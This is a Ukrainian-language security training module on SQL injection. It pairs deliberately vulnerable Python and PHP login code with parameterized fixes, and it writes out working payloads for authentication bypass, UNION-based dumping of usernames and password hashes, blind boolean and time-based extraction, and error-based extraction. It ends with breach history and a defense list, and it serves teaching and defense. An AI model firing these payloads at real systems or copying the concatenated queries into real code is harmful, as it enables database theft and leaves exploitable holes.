Модуль 11 — SQL-ін'єкція

Дідусь веб-вразливостей

SQL injection існує з кінця 1990-х. Її вперше публічно задокументував Джефф Форрістал (під псевдонімом «rain.forest.puppy») у журналі Phrack Magazine в 1998 році. Це понад 25 років тому. І все ж, у 2024 році, SQLi досі входить в OWASP Top 10 і досі спричиняє масові витоки даних. Чому? Бо фундаментальна помилка — змішування коду і даних — неймовірно легко зробити і надзвичайно важко викорінити в великих кодових базах.

Ось що робить SQL injection такою небезпечною: вона дає атакуючому прямий доступ до твоєї бази даних. Не фільтрований доступ. Не тільки для читання. Повний доступ до кожної таблиці, кожного рядка, кожної колонки. І в багатьох конфігураціях вона виходить за межі бази — читання файлів із файлової системи сервера, виконання команд ОС або переміщення до інших систем у мережі.

Якщо XSS — це крадіжка з кишені, то SQL injection — це прохід прямо в банківське сховище.

Чому SQL injection існує

Кожна SQL injection має одну й ту саму першопричину: введення користувача конкатенується безпосередньо в рядок SQL-запиту. Движок бази даних отримує повний запит одним рядком і не може відрізнити частини, що є «кодом» (SQL-структура, написана розробником), від частин, що є «даними» (значення, надані користувачем).

Покажу точно, як це працює. Уяви форму входу, що перевіряє облікові дані:

Вразливий код: конкатенація рядків

# Python — VULNERABLE
username = request.form['username']
password = request.form['password']
query = f"SELECT * FROM users WHERE username='{username}' AND password_hash='{password}'"
cursor.execute(query)
// PHP — VULNERABLE
$username = $_POST['username'];
$password = $_POST['password'];
$query = "SELECT * FROM users WHERE username='$username' AND password_hash='$password'";
$result = mysqli_query($conn, $query);

Коли звичайний користувач вводить alice і mypassword, запит стає: 

SELECT * FROM users WHERE username='alice' AND password_hash='mypassword'

Все чудово. Але що буде, коли атакуючий введе ' OR '1'='1 як ім'я? 

SELECT * FROM users WHERE username='' OR '1'='1' AND password_hash='anything'

Одинарна лапка атакуючого закриває рядок username, а OR '1'='1' інтерпретується як SQL-код, а не дані. Оскільки '1'='1' завжди істинне, WHERE повертає всі рядки, і атакуючий увійшов — зазвичай як перший користувач у таблиці, що часто є адміном.

Фундаментальна проблема: Коли ти конкатенуєш рядки в запит, база даних не може визначити, де закінчується SQL розробника і починаються дані користувача. Одинарна лапка виконує подвійну роль — вона і роздільник рядків у SQL, і цілком допустимий символ у введенні. Ця двозначність — корінь всіх SQL injection.

Виправлення: параметризовані запити

Параметризовані запити (prepared statements) вирішують це повністю, відділяючи SQL-структуру від значень даних. SQL-шаблон надсилається до бази першим, а значення — окремо. База точно знає, що є кодом, а що — даними. Ін'єкція стає неможливою. 

# Python — SAFE (parameterized)
cursor.execute(
    "SELECT * FROM users WHERE username=? AND password_hash=?",
    (username, password)
)
// PHP — SAFE (prepared statement)
$stmt = $conn->prepare("SELECT * FROM users WHERE username=? AND password_hash=?");
$stmt->bind_param("ss", $username, $password);
$stmt->execute();

Навіть якщо атакуючий введе ' OR '1'='1, база трактує весь рядок як буквальне значення username. Вона шукає користувача з ім'ям буквально ' OR '1'='1 — якого не існує. Ніякої ін'єкції. Ніякого обходу.

Аналогія: Уяви заповнення паперової форми. Конкатенація рядків — це дозволити користувачу писати на самій формі — він може вийти за межі полів і змінити інструкції форми. Параметризовані запити — це коли користувач пише на стікерах, що вкладаються В поля — що б він не написав, це залишається всередині визначеної області і не може змінити структуру форми.

UNION-Based SQL Injection

Обхід автентифікації — це лише початок. Справжня сила SQL injection — це вилучення даних. Атака UNION SELECT додає другий запит до оригінального, дозволяючи читати дані з БУДЬ-ЯКОЇ таблиці бази. Це як можливість фотокопіювати будь-який файл у шафі — а не тільки той, що тобі дали.

Дві вимоги для UNION-атаки:

  1. Кількість колонок у впровадженому SELECT має точно збігатися з оригінальним запитом.
  2. Типи даних відповідних колонок мають бути сумісні (або використовуй NULL, що сумісний з усім).

Крок 1 — Визначення кількості колонок

Техніка A — ORDER BY: Збільшуй індекс колонки, поки не отримаєш помилку. 

-- If the query has 4 columns:
' ORDER BY 1--    (OK — column 1 exists)
' ORDER BY 2--    (OK — column 2 exists)
' ORDER BY 3--    (OK — column 3 exists)
' ORDER BY 4--    (OK — column 4 exists)
' ORDER BY 5--    (ERROR! — column 5 does not exist → table has 4 columns)

Техніка B — UNION SELECT NULL: Додавай NULL, поки запит не спрацює. 

' UNION SELECT NULL--                     (error — wrong column count)
' UNION SELECT NULL,NULL--                (error)
' UNION SELECT NULL,NULL,NULL--           (error)
' UNION SELECT NULL,NULL,NULL,NULL--      (success! — 4 columns)

Крок 2 — Визначення колонок виводу

' UNION SELECT 'col1','col2','col3','col4'--

Якщо ти бачиш «col2» і «col3» на сторінці, але не «col1» і «col4», ти знаєш, куди вставляти вилучені дані.

Крок 3 — Вилучення даних

-- Extract all usernames and password hashes
' UNION SELECT NULL, group_concat(username || ':' || password_hash, '<br>'), NULL, NULL FROM users--

Blind SQL Injection — коли не видно результат

Що якщо додаток не відображає результати запиту? Blind SQL injection дозволяє вилучати дані по одному біту, ставлячи базі питання «так/ні» та спостерігаючи за поведінкою.

Boolean-Based Blind

-- Is the first character of the admin password 'a'?
' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'--
-- If the page loads normally → 'a' is correct
-- If the page shows an error → 'a' is wrong, try 'b', 'c', etc.

Time-Based Blind

-- MySQL: if the first char of the DB name is 'a', wait 5 seconds
' AND IF(SUBSTRING(database(),1,1)='a', SLEEP(5), 0)--

-- PostgreSQL equivalent
'; SELECT CASE WHEN SUBSTRING(current_database(),1,1)='a' THEN pg_sleep(5) END--

Якщо відповідь займає 5 секунд — умова істинна. Якщо повертається одразу — хибна. Повільно? Надзвичайно. Але працює.

sqlmap — швейцарський ніж: У реальному пентесті ніхто не робить blind SQLi вручну. Інструмент sqlmap автоматизує виявлення і експлуатацію всіх типів SQL injection. Але розуміння технік вручну необхідне — автоматичні інструменти не справляються з крайніми випадками.

Error-Based Injection

-- MySQL error-based extraction (EXTRACTVALUE technique)
' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--
-- Error: "XPATH syntax error: '~5.7.44~'"
-- The database version is right there in the error message!

Реальні зломи через SQL Injection

  • Heartland Payment Systems (2008): Альберт Гонсалес використав SQL injection для крадіжки 130 мільйонів номерів кредитних карт. Він отримав 20 років тюрми.
  • Sony Pictures (2011): LulzSec експлуатували тривіальну SQL injection для вилучення 1 мільйона акаунтів.
  • TalkTalk (2015): 15-річний підліток отримав доступ до даних 157 000 клієнтів через SQLi. TalkTalk оштрафували на £400 000.
  • MOVEit Transfer (2023): SQL injection у продукті для передачі файлів, експлуатована групою Cl0p, зачепила понад 2 600 організацій і 77 мільйонів людей.
Повний стек захисту:
  • Параметризовані запити скрізь — це одне запобігає 99% SQLi
  • Мінімальні привілеї для БД — користувач БД веб-додатку не повинен бути root
  • Web Application Firewall (WAF) — ловить очевидні пейлоади, але обходиться
  • Валідація вводу — відхиляй ввід з неочікуваними символами як додатковий шар
  • Обробка помилок — ніколи не показуй сирі помилки БД користувачам
  • Використання ORM — Django ORM, SQLAlchemy, ActiveRecord використовують параметризовані запити за замовчуванням
